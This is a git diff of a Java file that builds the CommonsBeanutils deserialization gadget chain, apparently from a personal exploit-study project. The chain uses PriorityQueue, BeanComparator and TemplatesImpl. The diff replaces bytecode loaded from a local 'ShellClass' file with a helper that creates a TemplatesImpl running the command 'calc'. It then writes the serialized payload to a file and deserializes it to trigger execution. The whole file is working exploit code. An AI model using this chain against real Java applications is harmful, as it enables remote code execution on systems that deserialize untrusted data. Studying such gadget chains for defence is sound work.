@@ -1,5 +1,6 @@
 package Seri.CBGadgets;
 
+import Seri.Utils;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import org.apache.commons.beanutils.BeanComparator;
@@ -19,12 +20,7 @@ PriorityQueue.readObject()
  */
 public class CommonsBeanutils {
     public static void main(String[] args) throws Exception {
-        TemplatesImpl templateimpl = new TemplatesImpl();
-        byte[] bytes = Files.readAllBytes(Paths.get("/Users/y1shin/IdeaProjects/Seri/target/classes/Seri/ShellClass.class"));
-
-        setValue(templateimpl,"_name","aaa");
-        setValue(templateimpl,"_bytecodes",new byte[][] {bytes});
-        setValue(templateimpl,"_tfactory",new TransformerFactoryImpl());
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
         BeanComparator beanComparator = new BeanComparator();
 //        beanComparator.compare(templateimpl ,templateimpl);
@@ -32,7 +28,7 @@ public class CommonsBeanutils {
         priorityQueue.add("1");
         priorityQueue.add("1");
         setValue(beanComparator ,"property" ,"outputProperties");
-        setValue(priorityQueue,"queue",new Object[]{templateimpl,templateimpl});
+        setValue(priorityQueue,"queue",new Object[]{templates,templates});
 
         serialize(priorityQueue ,"bin/CB2.bin");
         unserialize("bin/CB2.bin");
